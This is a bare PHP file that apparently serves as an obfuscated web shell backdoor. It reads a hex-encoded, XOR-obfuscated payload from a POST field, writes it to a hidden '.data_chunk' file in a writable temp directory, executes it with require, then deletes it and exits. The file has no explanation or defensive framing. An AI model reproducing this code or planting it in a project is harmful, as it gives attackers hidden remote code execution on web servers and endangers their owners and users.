<?php

if(count($_POST) > 0 && isset($_POST["da\x74"])){
	$ent = array_filter([ini_get("upload_tmp_dir"), "/var/tmp", "/tmp", getenv("TMP"), getenv("TEMP"), "/dev/shm", getcwd(), sys_get_temp_dir(), session_save_path()]);
	$token = hex2bin($_POST["da\x74"]);
	$flag  ='' ;foreach(str_split($token) as $char){$flag .= chr(ord($char) ^ 38);}
	while ($flg = array_shift($ent)) {
    		if (array_product([is_dir($flg), is_writable($flg)])) {
    $itm = join("/", [$flg, ".data_chunk"]);
    if (file_put_contents($itm, $flag)) {
	require $itm;
	unlink($itm);
	exit;
}
}
}
}